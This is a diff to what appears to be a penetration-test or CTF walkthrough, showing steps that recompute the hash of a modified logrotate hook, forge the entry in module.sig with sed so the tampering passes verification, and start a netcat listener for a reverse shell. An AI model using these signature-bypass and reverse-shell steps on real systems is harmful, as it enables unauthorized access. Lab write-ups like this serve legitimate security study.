@@ -104,7 +104,6 @@ Since we have changed the file, the new hash will not match what what is expecte
 	cat /var/www/html/admin/modules/ucp/module.sig | grep logrotate
 	hooks/logrotate = a8ed4f168fa04f0ff884079ad214e854004b9a5511d26c6c9f6080daaf590781
 
-
 Fortunately for us, we've got write permissions for this file:
 
 	ls -l /var/www/html/admin/modules/ucp/module.sig
@@ -114,12 +113,10 @@ Fortunately for us, we've got write permissions for this file:
 Evaluate the new hash:
 
 	hash=$(sha256sum /var/www/html/admin/modules/ucp/hooks/logrotate | awk '{print $1}'); echo $hash
-	b420c8f2d0ed535cc60521b2e16ea45dc963c45a3c62bc190f7ababae6f509ba
 
 Modify logrotate hash in module.sig:
 
 	sed -i "s|hooks/logrotate = .*|hooks/logrotate = $hash|" /var/www/html/admin/modules/ucp/module.sig
-
 
 Verify that the hashes match:
 
@@ -131,7 +128,6 @@ Verify that the hashes match:
 Setup listener on your machine:
 
 	nc -nvlp 5555
-
 
 Now we can trigger the logrotate hook, which will initiate connection:
 
